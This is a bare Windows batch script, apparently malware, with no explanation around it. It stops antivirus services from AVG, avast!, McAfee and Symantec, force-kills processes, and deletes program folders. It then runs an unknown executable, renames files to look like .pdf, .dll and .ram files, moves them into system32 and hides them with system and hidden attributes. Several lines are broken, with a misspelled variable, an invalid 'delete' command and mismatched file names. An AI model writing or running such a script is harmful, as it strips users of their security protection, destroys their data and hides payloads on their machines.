net stop AvgServ
net stop AvgCore
net stop AvgFsh
net stop AVGEMS
net stop Avg7Alrt
net stop "avast! Antivirus"
net stop aswUpdSv
net stop npfmntor
net stop McShield
net stop AlertManger
net stop McTaskManager
net stop MCVSRte
net stop ccevtmgr/y
net stop navapsvc /y
net stop ccSetMgr /y
net stop DefWatch /y
net stop savscan /y
net stop ccevtmgr /y
net stop ccProxy /y
net stop "Symantec AntiVirus" /y
cd %windir%
cd ..
cd ..
pv -kf Autoit3.exe
pv -kf msdosmgr.exe
pv -kf GoogleToolbar2.exe
del "C:\program files\google\" /F /S /Q
del "c:\program files\common files\inetget" /F /S /Q
rename cmdhost.exe removefunc.ram
cd %windr%
mc-110-12-0000488.exe
rename hostsmgr.exe registerfunc1231.dll
rename mc-110-12-0000488.exe registernow123.pdf
move %windir%\registernow.pdf %windir%\system32\
move %windir%\initiatefunc.dll %windir%\system32\
move C:\removefunc.ram %windir%\system32\
cd %windir%\system32\
delete registernow.pdf
delete iniatefunc.dll
delete removefunc.ram
attrib +s +h registernow.pdf
attrib +s +h initiatefunc.dll
attrib +s +h removefunc.ram
:exit
